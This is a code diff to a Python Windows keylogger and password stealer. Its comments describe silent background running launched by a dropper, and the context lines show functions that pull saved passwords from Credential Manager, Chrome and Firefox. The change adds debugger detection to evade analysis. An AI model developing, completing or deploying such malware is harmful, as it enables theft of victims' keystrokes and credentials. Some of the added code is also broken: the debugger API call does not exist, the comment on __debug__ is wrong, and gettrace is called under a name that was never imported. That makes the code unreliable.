@@ -24,6 +24,8 @@ import win32cred
 import sqlite3
 import shutil
 import win32crypt
+import win32process
+from sys import gettrace as sys_gettrace
 
 #Variables
 user32 = windll.user32
@@ -254,6 +256,16 @@ def get_firefox_passwords(quiet=0):
         conn.close()
 #------------------------END Passwordextraction------------------------
 
+#------------------------Detect Debuggers------------------------
+def is_debugger_present():
+    if win32process.IsDebugged():
+        return True
+    else:
+        return False
+
+__debug__ #true if started with python -d, else wrong
+#------------------------END Detect Debuggers------------------------
+
 
 #Test all of the above functions:
 def main():
@@ -261,11 +273,20 @@ def main():
     #SaveScreenshot("test.png")
     
     #test function keyStroke
-    get_current_process()
+    #get_current_process()
 
     #test path function
     #print(get_path())
 
+    #functions to extract passwords
+    #get_credman_passwords()
+    #get_chrome_passwords()
+    #get_firefox_passwords()
+
+    #debugger detection
+    #if is_debugger_present() == True or __debug__ == True or sys.gettrace() != None:
+    #    print("Debugger detected!")
+    pass
    #############to run this keylogger silently, meaning without a shown console, one would have to start it with pythonw <script.py>
    #############this is meant to run a script with a GUI. meaning the keylogger will be run silently in the background... (Start from Dropper software)
 
